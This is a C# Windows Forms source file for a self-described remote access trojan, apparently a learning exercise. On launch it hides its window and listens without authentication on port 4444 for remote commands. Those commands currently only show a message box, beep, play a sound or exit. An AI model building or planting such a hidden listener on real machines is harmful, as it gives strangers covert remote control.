using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace UnlimitedCommandsRAT
{
    public partial class Form1 : Form
    {
        TcpListener tcpListener;
        Socket socketForClient;
        NetworkStream networkStream;
        StreamReader streamReader;
        StreamWriter streamWriter; // To send data from server back to client

        Thread th_message, th_beep, th_playsound;

        // Commands from client
        private enum command { HELP =1, MESAGE =2, BEEP =3, PLAYSOUND =4, SHUTDOWNSERVER =5};

        // Help to be sent to Client
        const string strHelp = "Command Menu:\r\n" +
                                "1 This Help\r\n" +
                                "2 Message\r\n" +
                                "3 Beep\r\n" +
                                "4 Playsound\r\n" +
                                "5 Shutdown the Server Process and Port\r\n";
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
            tcpListener = new TcpListener(System.Net.IPAddress.Any, 4444);
            tcpListener.Start();
            for (; ; ) RunServer();
        }
        /// <summary>
        /// Starts the server
        /// </summary>
        private void RunServer()
        {
            socketForClient = tcpListener.AcceptSocket();
            networkStream = new NetworkStream(socketForClient);
            streamReader = new StreamReader(networkStream);
            streamWriter = new StreamWriter(networkStream);

            try
            {
                // Display sucessful connection for Client
                streamWriter.Write("Connected to RAT server. Type 1 for help\r\n");
                streamWriter.Flush();
                string line; 
                Int16 intCommand = 0;

                while (true)
                {
                    line = "";
                    line = streamReader.ReadLine();

                    // Cleaning out junkcharacters sent by client on occasion
                    intCommand = GetCommandFromLine(line);

                    switch ((command)intCommand)
                    {
                        case command.HELP:
                            streamWriter.Write(strHelp);
                            streamWriter.Flush();
                            break;
                        case command.MESAGE:
                            th_message = new Thread(new ThreadStart(MessageCommand));
                            th_message.Start();
                            break;
                        case command.BEEP:
                            th_beep = new Thread(new ThreadStart(BeepCommand));
                            th_beep.Start();
                            break;
                        case command.PLAYSOUND:
                            th_playsound = new Thread(new ThreadStart(PlaySoundCommand));
                            th_playsound.Start();
                            break;
                        case command.SHUTDOWNSERVER:
                            streamWriter.Flush();
                            cleanUp();
                            System.Environment.Exit(System.Environment.ExitCode);
                            break;                        
                    }
                }
            }
            catch (Exception exp)
            {
                cleanUp();
            }
        }

        private void cleanUp()
        {
            streamReader.Close();
            networkStream.Close();
            socketForClient.Close();
        }

        private void PlaySoundCommand()
        {
            System.Media.SoundPlayer soundPlayer = new System.Media.SoundPlayer();
            soundPlayer.SoundLocation = @"C:\Windows\Media\chimes.wav";
            soundPlayer.Play();
        }

        private void BeepCommand()
        {
            Console.Beep(500, 2000);
        }

        private void MessageCommand()
        {
            MessageBox.Show("Hello World!");
        }

        /// <summary>
        /// Search string line for numbers and converts them to integers
        /// </summary>
        /// <param name="line"></param>
        /// <returns>int16</returns>
        /// <exception cref="NotImplementedException"></exception>
        private Int16 GetCommandFromLine(string line)
        {
            Int16 intExtractedCommand = 0;
            int i;
            Char charachter;
            StringBuilder stringBuilder = new StringBuilder();

            for (i = 0; i < line.Length; i++)
            {
                charachter = Convert.ToChar(line[i]);
                if (Char.IsDigit(charachter))
                {
                    stringBuilder.Append(charachter);
                }
            }
            //Convert the stringBuilder string of numbers to integer
            try
            {
                intExtractedCommand = Convert.ToInt16(stringBuilder.ToString());
            }
            catch (Exception err)
            {
                
            }
            return intExtractedCommand;
        }
    }
}
